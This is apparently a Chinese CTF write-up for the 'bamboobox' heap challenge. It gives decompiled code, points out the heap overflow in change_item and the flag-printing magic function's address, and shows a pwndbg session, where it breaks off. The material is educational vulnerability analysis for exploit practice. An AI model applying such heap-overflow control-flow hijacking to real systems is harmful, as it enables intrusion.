box));<br>  bamboo-&gt;hello_message = hello_message;<br>  bamboo-&gt;goodbye_message = goodbye_message;<br>  bamboo-&gt;hello_message();<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, choicebuf, <span class="hljs-number">8</span>);<br>    choice = atoi(choicebuf);<br>    <span class="hljs-keyword">switch</span> (choice) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      show_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      add_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      change_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      remove_item();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>      bamboo-&gt;goodbye_message();<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a><strong>IDA静态分析</strong></h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">void</span> (**v4)(<span class="hljs-type">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  v4 = (<span class="hljs-type">void</span> (**)(<span class="hljs-type">void</span>))<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *v4 = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))hello_message;<br>  v4[<span class="hljs-number">1</span>] = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))goodbye_message;<br>  (*v4)();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    <span class="hljs-keyword">switch</span> ( atoi(buf) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        show_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        add_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        change_item(buf, buf);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        remove_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        v4[<span class="hljs-number">1</span>]();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>        <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>​main函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。</p><h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>这是一个程序的菜单函数，没有什么特别的。</p><h3 id="show-item"><a href="#show-item" class="headerlink" title="show_item"></a>show_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">show_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( !num )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( itemlist[i].content )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i, itemlist[i].content);<span class="hljs-comment">//老老实实打印堆块的内容</span><br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(byte_401089);<br>}<br></code></pre></td></tr></tbody></table></figure><p>首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。</p><h3 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">add_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">99</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the box is full"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v2 = atoi(buf);<span class="hljs-comment">//输入准备输入内容的长度</span><br>    <span class="hljs-keyword">if</span> ( !v2 )<br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    }<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>    {<br>      <span class="hljs-keyword">if</span> ( !itemlist[i].content )<br>      {<br>        LODWORD(itemlist[i].size) = v2;<br>        itemlist[i].content = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(v2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the name of item:"</span>);<br>        itemlist[i].content[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, itemlist[i].content, v2)] = <span class="hljs-number">0</span>;<br>        ++num;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      }<span class="hljs-comment">//根据输入的长度，malloc大小，并填充数据</span><br>    }<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>首先根据num判断是否堆满了，然后根据堆结构体写入数据</p><p>根据输入的长度，生成一个堆，然后填入数据，不存在溢出</p><h3 id="change-item"><a href="#change-item" class="headerlink" title="change_item"></a>change_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">change_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> nptr[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v1 = atoi(buf);<br>    <span class="hljs-keyword">if</span> ( itemlist[v1].content )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>      read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">8uLL</span>);<br>      v2 = atoi(nptr);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>);<br>      itemlist[v1].content[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, itemlist[v1].content, v2)] = <span class="hljs-number">0</span>;<span class="hljs-comment">// //存在堆溢出，输出长度由我们自己决定</span><br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;<br>}<br></code></pre></td></tr></tbody></table></figure><p>又可以往堆中写入内容，这次长度由我们自己决定，存在堆溢出！！！</p><h3 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">remove_item</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v1 = atoi(buf);<br>    <span class="hljs-keyword">if</span> ( itemlist[v1].content )<br>    {<br>      <span class="hljs-built_in">free</span>(itemlist[v1].content);<br>      itemlist[v1].content = <span class="hljs-number">0LL</span>;<br>      LODWORD(itemlist[v1].size) = <span class="hljs-number">0</span>;           <span class="hljs-comment">// free了且将指针置0，不存在UAF</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      --num;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure><p>free(itemlist[v1].content);free(itemlist[index].name);<br>itemlist[v1].content = 0LL; -&gt;    itemlist[index].name = 0;<br>LODWORD(itemlist[v1].size) = 0;itemlist[index].size = 0;</p><p>free 了 堆块，清空指针，不存在uaf</p><h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-74h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  fd = open(<span class="hljs-string">"./flag"</span>, <span class="hljs-number">0</span>);<br>  read(fd, buf, <span class="hljs-number">0x64</span>uLL);<br>  close(fd);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buf);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>magic = 0x400D49 </p><p>目标地址，控制程序执行流到magic函数的位置即可get flag</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00000000</span> item            struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x10</span>, mappedto_6)<br><span class="hljs-number">00000000</span>                                         ; XREF: .bss:itemlist/r<br><span class="hljs-number">00000000</span> size            dq ?<br><span class="hljs-number">00000008</span> content         dq ?                    ; offset<br><span class="hljs-number">00000010</span> item            ends<br><span class="hljs-number">00000010</span><br></code></pre></td></tr></tbody></table></figure><p>对应c代码的 item 结构体</p><h2 id="pwndbg-动态调试"><a href="#pwndbg-动态调试" class="headerlink" title="pwndbg 动态调试"></a>pwndbg 动态调试</h2><h3 id="堆内存分布"><a href="#堆内存分布" class="headerlink" title="堆内存分布"></a>堆内存分布</h3><p>首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：</p><ul><li>chunk0:size=10，content=”aaaaa”</li><li>chunk1:size=20，content=”bbbbb”</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontrani<br>ng_lab11$ gdb bamboobox<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from bamboobox...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox <br>There is a box with magic<br>what <span class="hljs-keyword">do</span> you want to <span class="hljs-keyword">do</span> in the box<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:10<br>Please enter the name of item:aaaaa<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:2<br>Please enter the length of item name:20<br>Please enter the name of item:bbbbb<br>----------------------------<br>Bamboobox Menu<br>----------------------------<br>1.show the items in the box<br>2.add a new item<br>3.change the item in the box<br>4.remove the item in the box<br>5.<span class="hljs-built_in">exit</span><br>----------------------------<br>Your choice:^C<br>Program received signal SIGINT, Interrupt.<br>0x00007ffff7b04360 in __<span class="hljs-title function_">read_nocancel</span> <span class="hljs-params">()</span> at ../sysdeps/unix/syscall-template.S:84<br>84../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  0xfffffffffffffe00<br> RBX  0x0<br> RCX  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br> RDX  0x8<br> RDI  0x0<br> RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br> R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700<br> R9   0xc<br> R10  0x0<br> R11  0x246<br> R12  0<span class="hljs-title function_">x4007a0</span> <span class="hljs-params">(_start)</span> ◂— xor    ebp, ebp<br> R13  0x7fffffffdd30 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br> RSP  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br> RIP  0<span class="hljs-title function_">x7ffff7b04360</span> <span class="hljs-params">(__read_nocancel+<span class="hljs-number">7</span>)</span> ◂— cmp    rax, -0xfff<br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff<br>   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;<br>    ↓<br>   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]<br>   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax<br>   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax<br>   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff<br>   0x7ffff7b043a9 &lt;read+89&gt;               ret    <br> <br>   0x7ffff7b043aa                         nop    word ptr [rax + rax]<br>   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;<br>   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;<br>    ↓<br>   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8<br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br>00:0000│ rsp  0x7fffffffdc28 —▸ 0<span class="hljs-title function_">x400e5d</span> <span class="hljs-params">(main+<span class="hljs-number">166</span>)</span> ◂— lea    rax, [rbp - 0x10]<br>01:0008│      0x7fffffffdc30 ◂— 0x200400ee0<br>02:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0<span class="hljs-title function_">x400896</span> <span class="hljs-params">(hello_message)</span> ◂— push   rbp<br>03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0<br>04:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b00<br>05:0028│ rbp  0x7fffffffdc50 —▸ 0<span class="hljs-title function_">x400ee0</span> <span class="hljs-params">(__libc_csu_init)</span> ◂— push   r15<br>06:0030│      0x7fffffffdc58 —▸ 0<span class="hljs-title function_">x7ffff7a2d840</span> <span class="hljs-params">(__libc_start_main+<span class="hljs-number">240</span>)</span> ◂— mov    edi, eax<br>07:0038│      0x7fffffffdc60 ◂— 0x0<br>───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────<br> ► f 0     7ffff7b04360 __read_nocancel+7<br>   f 1           400e5d main+166<br>   f 2     7ffff7a2d840 __libc_start_main+240<br>Program received signal SIGINT<br>pwndbg&gt; 